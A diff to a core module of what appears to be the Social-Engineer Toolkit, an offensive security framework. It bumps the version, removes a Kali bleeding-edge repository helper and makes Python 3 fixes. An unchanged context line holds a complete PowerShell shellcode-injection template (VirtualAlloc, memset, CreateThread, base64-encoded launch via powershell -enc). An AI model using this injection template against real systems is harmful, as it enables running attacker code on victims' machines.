@@ -260,7 +260,7 @@ def print_error(message):
 
 
 def get_version():
-    define_version = '7.0.2'
+    define_version = '7.0.3'
     return define_version
 
 class create_menu:
@@ -488,9 +488,7 @@ def update_set():
 
     elif kali == "Kali":
         print_status("You are running Kali Linux which maintains SET updates.")
-        print_status("You can enable bleeding-edge repos for up-to-date SET.")
         time.sleep(2)
-        bleeding_edge()
 
     # if we aren't running Kali or BackBox :(
     else:
@@ -1415,7 +1413,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
         r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (shellcode))
 
     # unicode and base64 encode and return it
-    return base64.b64encode(powershell_command.encode('utf_16_le'))
+    return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
 def generate_shellcode(payload, ipaddr, port):
@@ -1821,44 +1819,7 @@ def check_kali():
         print("[!] Not running a Debian variant..")
         return "Non-Kali"
 
-# checking if we have bleeding-edge enabled for updates
-
-
-def bleeding_edge():
-    bleeding = check_config("BLEEDING_EDGE=").lower()
-    if bleeding == "on":
-            # first check if we are actually using Kali
-        kali = check_kali()
-        if kali == "Kali":
-            print_status("Checking to see if bleeding-edge repos are active.")
-            # check if we have the repos enabled first
-            if os.path.isfile("/etc/apt/sources.list.d/bleeding.list"):
-                print_status("Bleeding edge already active..Moving on..")
-                return True
-            else:
-                print_warning(
-                    "Bleeding edge repos were not detected. Use at your own risk!")
-                enable = raw_input(
-                    "Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
-                if enable == "y" or enable == "yes":
-                    print_status(
-                        "Adding Kali bleeding edge to sources.list for updates.")
-                    # we need to add repo to a new sources file
-                    filewrite = open("/etc/apt/sources.list.d/bleeding.list", "w")
-                    filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org kali-bleeding-edge main contrib non-free")
-                    filewrite.close()
-                    print_status("It is recommended that you run apt-get update && apt-get upgrade && apt-get dist-upgrade, then apt-get -t install -t kali-bleeding-edge set framework3")
-                    return True
-                else:
-                    print(
-                        "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!")
-
-        else:
-            print("[*] Kali Linux was not detected, moving on...")
-
 # here we give multiple options to specify for SET java applet
-
-
 def applet_choice():
 
     # prompt here
@@ -1906,7 +1867,7 @@ def module_reload(module):
         import importlib
         importlib.reload(module)
     else:
-        module_reload(module)
+        reload(module)
 
 # used to replace any input that we have from python 2 to python 3
 def input(string):
@@ -1938,6 +1899,6 @@ def tail(filename):
                 time.sleep(1)
                 file.seek(where)
             else:
-                print line, # already has newline
+                print(line,) # already has newline
 
     else: print_error("File not found, cannot tail.")
